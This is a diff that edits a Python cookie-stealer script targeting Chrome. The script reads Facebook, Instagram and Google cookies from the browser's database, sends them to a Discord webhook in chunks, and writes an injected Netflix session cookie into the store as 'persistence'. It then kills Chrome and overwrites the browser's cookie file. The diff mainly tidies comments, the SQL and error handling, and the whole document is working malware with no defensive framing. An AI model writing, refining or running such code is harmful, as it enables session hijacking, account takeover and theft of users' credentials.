@@ -61,7 +61,7 @@ def execute_protocol():
             print("[!] Keychain Handshake Failed.")
             return
 
-        # 2. Extract Logic (Meta & More)
+        # 2. Extract Logic
         query = "SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%facebook.com%' OR host_key LIKE '%instagram.com%' OR host_key LIKE '%google.com%'"
         cursor.execute(query)
         
@@ -71,7 +71,7 @@ def execute_protocol():
             if val:
                 results.append(f"Domain: {host} | Name: {name} | Value: {val}")
 
-        # 3. Exfiltration Discrète
+        # 3. Exfiltration
         if results:
             print(f"[+] Found {len(results)} sensitive nodes. Exfiltrating...")
             chunks = [results[i:i + 15] for i in range(0, len(results), 15)]
@@ -79,34 +79,31 @@ def execute_protocol():
                 payload = {"content": "```" + "\n".join(chunk) + "```"}
                 requests.post(DISCORD_WEBHOOK, json=payload)
 
-       # 4. Injection Netflix (The 'Gold' Move)
+        # 4. Injection Netflix (Surgical Fix)
         if NETFLIX_COOKIE_VAL:
             print("[*] Injecting Persistence Layer...")
-            # Timestamp Chrome : Microsecondes depuis le 1er Janvier 1601
+            # Timestamp Chrome precise
             now_ts = int((time.time() + 11644473600) * 1000000)
-            expiry = 13350000000000000 # 2027+
+            expiry = 13350000000000000 
             
-            # On inclut TOUTES les colonnes critiques pour bypasser les contraintes NOT NULL
-            cursor.execute("""
-                INSERT OR REPLACE INTO cookies 
-                (creation_utc, host_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent) 
-                VALUES (?, '.netflix.com', 'NetflixId', ?, '/', ?, 1, 1, ?, 1, 1)
-            """, (now_ts, NETFLIX_COOKIE_VAL, expiry, now_ts))
+            sql = "INSERT OR REPLACE INTO cookies (creation_utc, host_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)"
+            values = (now_ts, '.netflix.com', 'NetflixId', NETFLIX_COOKIE_VAL, '/', expiry, 1, 1, now_ts, 1, 1)
             
+            cursor.execute(sql, values)
             conn.commit()
             print("[+] Persistence Layer Active.")
 
+    except Exception as e:
+        print(f"[!] Error: {e}")
     finally:
         conn.close()
         
-    # 5. Final Sync (The Critical Window)
-    kill_chrome() # On tue Chrome juste avant la copie finale
+    # 5. Final Sync
+    kill_chrome()
     try:
         shutil.copyfile(TEMP_DB, CHROME_PATH)
-        os.remove(TEMP_DB)
+        if os.path.exists(TEMP_DB):
+            os.remove(TEMP_DB)
         print("[+++] Protocol Success. Nodes Synced.")
     except Exception as e:
         print(f"[!] Sync Error: {e}")
-
-if __name__ == "__main__":
-    execute_protocol()
